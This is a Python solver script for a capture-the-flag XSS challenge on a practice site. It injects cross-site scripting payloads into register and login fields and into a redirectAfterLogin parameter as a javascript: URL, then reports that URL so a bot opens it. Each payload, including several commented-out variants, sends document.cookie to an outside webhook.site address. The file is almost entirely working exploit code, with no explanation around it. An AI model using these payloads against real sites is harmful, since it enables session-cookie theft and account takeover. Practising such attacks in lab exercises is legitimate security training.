import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import urllib.parse

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        BASE_URL = "https://xss-playground-4.quoccacorp.com"
        # PAYLOAD = f'''<script>fetch(`{self.webhooksite_url}?q=${{document.cookie}}`)</script>'''
        # PAYLOAD = f'''<img src="x" onerror="fetch(`{self.webhooksite_url}?q=${{document.cookie}}`)">'''
        # PAYLOAD = f'''<img src=x onerror="new Image().src='{self.webhooksite_url}?q='">'''
        # PAYLOAD = f'''<body onload=fetch('{self.webhooksite_url}?c='+document.cookie)>'''
        # PAYLOAD = f'''<svg src="x" onload="document.location='{self.webhooksite_url}?q='.concat(document.cookie)">'''
        PAYLOAD = f'''<svg src="x" onload="document.location='{self.webhooksite.url}?q='.concat(document.cookie)">'''


        response = self.session.get(f"{BASE_URL}/find-logged-in-page", params={"redirectAfterLogin": f"fetch(`{self.webhooksite.url}?q=${{document.cookie}}`"})
        print(response.text)

        json_payload = {"user": PAYLOAD, "pass": PAYLOAD}

        print(PAYLOAD)

        response = self.session.post(f"{BASE_URL}/api/register", json=json_payload)
        print(response.text)

        response = self.session.post(f"{BASE_URL}/api/login", json=json_payload)
        if ('{"success":false}' not in response.text):
            print(response.text)

        print(self.webhooksite.view_url)
        print(self.webhooksite.url)
        payload = f"javascript:fetch('{self.webhooksite.url}?q='+document.cookie)"
        encoded_payload = urllib.parse.quote(payload)
        exploit_url = (
            "https://xss-playground-4.quoccacorp.com/find-logged-in-page"
            f"?redirectAfterLogin={encoded_payload}"
        )
        print(exploit_url)


        report_url = exploit_url
        response = self.session.post(f"{BASE_URL}/report", data=report_url)

        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
